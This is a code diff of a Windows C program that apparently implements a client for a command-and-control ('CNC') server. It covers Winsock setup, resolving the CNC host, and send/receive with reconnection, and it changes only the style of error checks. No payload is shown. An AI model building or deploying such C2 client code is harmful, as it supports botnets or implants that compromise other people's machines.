@@ -17,7 +17,7 @@ void init_winsock()
     int ret = 0;
 
     ret = WSAStartup(MAKEWORD(2, 2), &wsaData);
-    if (ret)
+    if (ret != 0)
         fatal_error("WSAStartup failed: %d", ret);
     log_debug("Initialized Winsock.");
 }
@@ -30,12 +30,12 @@ void get_cnc_addrinfo(struct addrinfo **result)
     struct addrinfo *cnc_addrinfo, hints = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM, .ai_protocol = IPPROTO_TCP};
 
     ret = getaddrinfo(cnc_host, CNC_PORT, &hints, result);
-    if (ret)
+    if (ret != 0)
         fatal_error("getaddrinfo failed: %d", ret);
 
     cnc_addrinfo = *result;
     ret = WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
-    if (ret)
+    if (ret != 0)
         fatal_error("WSAAddressToStringA failed: %d", ret);
     log_debug("CNC's address: %s", cnc_addr);
 }
@@ -106,7 +106,7 @@ int send_cnc(void *buf, size_t len)
     bytes_sent = send(cnc_sock, buf, len, 0);
     if (bytes_sent == SOCKET_ERROR)
         fatal_error("Error at send(): %ld", WSAGetLastError());
-    if (!bytes_sent)
+    if (bytes_sent == 0)
     {
         log_error("Connection with CNC broke.");
         reconnect_to_cnc();
@@ -121,7 +121,7 @@ int recv_cnc(void *buf, size_t len)
     bytes_read = recv(cnc_sock, buf, len, 0);
     if (bytes_read == SOCKET_ERROR)
         fatal_error("Error at recv(): %ld", WSAGetLastError());
-    if (!bytes_read)
+    if (bytes_read == 0)
     {
         log_error("Connection with CNC broke.");
         reconnect_to_cnc();
